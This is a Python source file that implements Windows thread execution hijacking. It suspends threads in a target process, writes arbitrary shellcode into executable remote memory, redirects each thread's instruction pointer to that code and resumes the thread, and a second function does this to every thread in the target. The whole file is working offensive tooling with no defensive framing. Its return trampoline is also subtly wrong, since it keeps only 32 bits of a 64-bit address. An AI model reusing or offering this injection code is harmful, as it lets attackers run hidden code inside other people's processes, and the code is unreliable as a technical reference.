"""
Thread Execution Hijacking — suspends a thread in a target process,
redirects its RIP to a shellcode/function, then resumes it.
"""
from __future__ import annotations
import ctypes
import ctypes.wintypes
import os
import struct
import sys
from typing import Optional

if sys.platform != "win32":
    raise ImportError("thread_hijack requires Windows")

k32 = ctypes.windll.kernel32

THREAD_ALL_ACCESS       = 0x1F03FF
PROCESS_ALL_ACCESS      = 0x1F0FFF
MEM_COMMIT              = 0x1000
MEM_RESERVE             = 0x2000
PAGE_EXECUTE_READWRITE  = 0x40

# CONTEXT flags
CONTEXT_AMD64        = 0x00100000
CONTEXT_CONTROL      = CONTEXT_AMD64 | 0x1
CONTEXT_INTEGER      = CONTEXT_AMD64 | 0x2
CONTEXT_FULL         = CONTEXT_AMD64 | 0x7
CONTEXT_ALL          = 0x10001F

# ── Thread enumeration ────────────────────────────────────────────────────────

TH32CS_SNAPTHREAD = 0x00000004

class THREADENTRY32(ctypes.Structure):
    _fields_ = [
        ("dwSize",             ctypes.wintypes.DWORD),
        ("cntUsage",           ctypes.wintypes.DWORD),
        ("th32ThreadID",       ctypes.wintypes.DWORD),
        ("th32OwnerProcessID", ctypes.wintypes.DWORD),
        ("tpBasePri",          ctypes.c_long),
        ("tpDeltaPri",         ctypes.c_long),
        ("dwFlags",            ctypes.wintypes.DWORD),
    ]

def _enum_threads(pid: int) -> list[int]:
    """Return list of TIDs belonging to pid."""
    snap = k32.CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)
    if snap == ctypes.wintypes.HANDLE(-1).value:
        return []
    tids = []
    entry = THREADENTRY32()
    entry.dwSize = ctypes.sizeof(entry)
    if k32.Thread32First(snap, ctypes.byref(entry)):
        while True:
            if entry.th32OwnerProcessID == pid:
                tids.append(entry.th32ThreadID)
            entry.dwSize = ctypes.sizeof(entry)
            if not k32.Thread32Next(snap, ctypes.byref(entry)):
                break
    k32.CloseHandle(snap)
    return tids

# ── CONTEXT manipulation ──────────────────────────────────────────────────────

_CONTEXT_BUF_SIZE = 1232  # sizeof(CONTEXT) on x64 with alignment

def _get_context(hthread: int) -> bytearray:
    buf = bytearray(_CONTEXT_BUF_SIZE)
    struct.pack_into("<I", buf, 0x30, CONTEXT_ALL)  # ContextFlags at offset 0x30
    c_buf = (ctypes.c_uint8 * _CONTEXT_BUF_SIZE)(*buf)
    if not k32.GetThreadContext(hthread, c_buf):
        raise OSError(f"GetThreadContext failed: {k32.GetLastError()}")
    return bytearray(c_buf)

def _set_context(hthread: int, ctx: bytearray) -> None:
    c_buf = (ctypes.c_uint8 * _CONTEXT_BUF_SIZE)(*ctx)
    if not k32.SetThreadContext(hthread, c_buf):
        raise OSError(f"SetThreadContext failed: {k32.GetLastError()}")

def _get_rip(ctx: bytearray) -> int:
    return struct.unpack_from("<Q", ctx, 0xF8)[0]  # Rip at offset 0xF8

def _set_rip(ctx: bytearray, rip: int) -> None:
    struct.pack_into("<Q", ctx, 0xF8, rip)

# ── Memory helpers ────────────────────────────────────────────────────────────

def _open_process(pid: int) -> int:
    h = k32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    if not h:
        raise OSError(f"OpenProcess({pid}) failed: {k32.GetLastError()}")
    return h

def _alloc_remote(hproc: int, data: bytes) -> int:
    addr = k32.VirtualAllocEx(
        hproc, None, len(data), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE,
    )
    if not addr:
        raise OSError(f"VirtualAllocEx failed: {k32.GetLastError()}")
    written = ctypes.c_size_t(0)
    k32.WriteProcessMemory(hproc, ctypes.c_void_p(addr), data, len(data), ctypes.byref(written))
    return addr

# ── Thread hijacking ──────────────────────────────────────────────────────────

def hijack_thread(pid: int, shellcode: bytes, tid: Optional[int] = None) -> dict:
    """
    Suspend a thread in pid, write shellcode, redirect RIP, resume.
    Returns {'tid': int, 'original_rip': int, 'new_rip': int}.
    """
    if tid is None:
        tids = _enum_threads(pid)
        if not tids:
            raise OSError(f"No threads found in PID {pid}")
        tid = tids[0]

    hthread = k32.OpenThread(THREAD_ALL_ACCESS, False, tid)
    if not hthread:
        raise OSError(f"OpenThread({tid}) failed: {k32.GetLastError()}")

    hproc = _open_process(pid)

    # Suspend
    if k32.SuspendThread(hthread) == 0xFFFFFFFF:
        raise OSError(f"SuspendThread failed: {k32.GetLastError()}")

    # Capture CONTEXT
    ctx = _get_context(hthread)
    original_rip = _get_rip(ctx)

    # Write shellcode
    sc_addr = _alloc_remote(hproc, shellcode)

    # Build trampoline: execute shellcode then return to original RIP
    # push <original_rip>; ret — appended to shellcode
    trampoline = shellcode + b"\x68" + struct.pack("<I", original_rip & 0xFFFFFFFF) + b"\xC3"
    # Rewrite with trampoline (re-alloc since size changed)
    addr = k32.VirtualAllocEx(
        hproc, None, len(trampoline), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE,
    )
    written = ctypes.c_size_t(0)
    k32.WriteProcessMemory(hproc, ctypes.c_void_p(addr), trampoline, len(trampoline), ctypes.byref(written))
    # Free first alloc
    k32.VirtualFreeEx(hproc, ctypes.c_void_p(sc_addr), 0, 0x8000)

    # Redirect RIP
    _set_rip(ctx, addr)
    _set_context(hthread, ctx)

    # Resume
    k32.ResumeThread(hthread)

    print(f"[HIJACK] TID {tid} @ PID {pid}: RIP 0x{original_rip:016X} -> 0x{addr:016X}")

    k32.CloseHandle(hthread)
    k32.CloseHandle(hproc)
    return {"tid": tid, "original_rip": original_rip, "new_rip": addr}


def hijack_all_threads(pid: int, shellcode: bytes) -> list[dict]:
    """Hijack all threads in a process — useful for multi-threaded targets."""
    tids = _enum_threads(pid)
    results = []
    for tid in tids:
        try:
            r = hijack_thread(pid, shellcode, tid=tid)
            results.append(r)
        except Exception as e:
            print(f"[HIJACK] TID {tid} failed: {e}")
    return results
